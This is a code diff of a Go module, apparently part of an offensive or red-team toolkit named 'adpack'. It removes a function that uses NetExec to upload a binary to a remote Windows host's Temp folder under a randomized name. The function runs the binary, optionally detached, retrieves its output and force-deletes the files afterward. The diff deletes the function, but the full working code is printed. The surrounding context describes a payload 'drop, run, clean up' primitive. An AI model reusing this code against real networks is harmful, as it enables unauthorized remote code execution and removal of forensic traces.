@@ -11,8 +11,6 @@ import (
 	"path/filepath"
 	"strings"
 	"time"
-
-	"adpack/utils"
 )
 
 // PayloadDeployment is the canonical "drop a binary, run it, clean up" primitive
@@ -65,113 +63,6 @@ type DeploymentResult struct {
 	ExecError       string // Transport-level error message if execution failed
 	OutputRetrieved bool
 	CleanupErrors   []string
-}
-
-// DeployAndExec performs the full upload → run → optional retrieve → cleanup
-// sequence and returns a structured result. Errors are returned for the steps
-// that fail catastrophically; soft failures (e.g. cleanup) are recorded in
-// CleanupErrors so the caller can decide whether to surface them.
-func DeployAndExec(ctx context.Context, target NetExecTarget, dep PayloadDeployment) (*DeploymentResult, error) {
-	if dep.LocalPath == "" {
-		return nil, fmt.Errorf("DeployAndExec: LocalPath is required")
-	}
-	if dep.RemoteDir == "" {
-		dep.RemoteDir = `C:\Windows\Temp\`
-	}
-	if !strings.HasSuffix(dep.RemoteDir, `\`) {
-		dep.RemoteDir += `\`
-	}
-
-	hash, err := hashFile(dep.LocalPath)
-	if err != nil {
-		return nil, fmt.Errorf("hash %s: %w", dep.LocalPath, err)
-	}
-
-	if dep.RemoteName == "" {
-		dep.RemoteName = randomizedName(dep.LocalPath)
-	}
-	remotePath := dep.RemoteDir + dep.RemoteName
-
-	res := &DeploymentResult{BinaryHash: hash, RemotePath: remotePath}
-
-	// 1. Upload — distinguish a transport error (err != nil) from a process-
-	// level failure (err == nil but upload.Success == false) so the caller's
-	// error message isn't garbled by %w wrapping a nil error.
-	upload, err := NetExec.PutFile(ctx, target, dep.LocalPath, remotePath)
-	if err != nil {
-		return res, fmt.Errorf("upload %s → %s: %w", dep.LocalPath, remotePath, err)
-	}
-	if !upload.Success {
-		return res, fmt.Errorf("upload %s → %s: nxc returned non-zero (exit=%d, stderr=%q)",
-			dep.LocalPath, remotePath, upload.ExitCode, strings.TrimSpace(upload.Stderr))
-	}
-
-	// 2. Execute
-	cmd := remotePath
-	if len(dep.RemoteArgs) > 0 {
-		cmd = remotePath + " " + strings.Join(dep.RemoteArgs, " ")
-	}
-
-	if dep.Detached {
-		detachedCmd := fmt.Sprintf(`start /B %s`, cmd)
-		execTimeout := dep.PerAttemptTimeout
-		if execTimeout <= 0 {
-			execTimeout = 30 * time.Second
-		}
-		execCtx, cancel := context.WithTimeout(ctx, execTimeout)
-		r, err := NetExec.Run(execCtx, target, "-x", []string{detachedCmd})
-		cancel()
-		res.ExecMethod = "detached"
-		res.ExecStdout = r.Stdout
-		res.ExecStderr = r.Stderr
-		res.ExecSuccess = r.Success
-		if err != nil {
-			res.ExecError = err.Error()
-		}
-	} else {
-		fr, err := NetExec.RunFailover(ctx, target, cmd, dep.PerAttemptTimeout)
-		res.ExecMethod = fr.Method
-		res.ExecStdout = fr.Stdout
-		res.ExecStderr = fr.Stderr
-		res.ExecSuccess = fr.Success
-		if err != nil {
-			res.ExecError = err.Error()
-		}
-	}
-
-	// 3. Retrieve output (if requested)
-	if dep.OutputFile != "" && dep.LocalOutputPath != "" && res.ExecSuccess {
-		remoteOut := dep.OutputFile
-		if !strings.Contains(remoteOut, `\`) && !strings.Contains(remoteOut, "/") {
-			remoteOut = dep.RemoteDir + remoteOut
-		}
-		_, err := NetExec.GetFile(ctx, target, remoteOut, dep.LocalOutputPath)
-		if err == nil {
-			res.OutputRetrieved = true
-		}
-	}
-
-	// 4. Cleanup
-	if !dep.NoCleanup {
-		paths := []string{remotePath}
-		if dep.OutputFile != "" {
-			out := dep.OutputFile
-			if !strings.Contains(out, `\`) && !strings.Contains(out, "/") {
-				out = dep.RemoteDir + out
-			}
-			paths = append(paths, out)
-		}
-		for _, p := range paths {
-			delCmd := fmt.Sprintf(`del /F /Q "%s"`, p)
-			_, derr := NetExec.RunFailover(ctx, target, delCmd, 15*time.Second)
-			if derr != nil {
-				res.CleanupErrors = append(res.CleanupErrors,
-					fmt.Sprintf("delete %s: %v", p, derr))
-			}
-		}
-	}
-
-	return res, nil
 }
 
 // Deploy uploads `localPath` to RemoteDir under a randomized name (or the
@@ -280,7 +171,3 @@ func RandString(n int) string {
 	}
 	return hex.EncodeToString(b)
 }
-
-// SuppressUnused keeps the linter happy when a caller imports this file purely
-// for the types. Costs nothing at runtime.
-var _ = utils.RunCommand
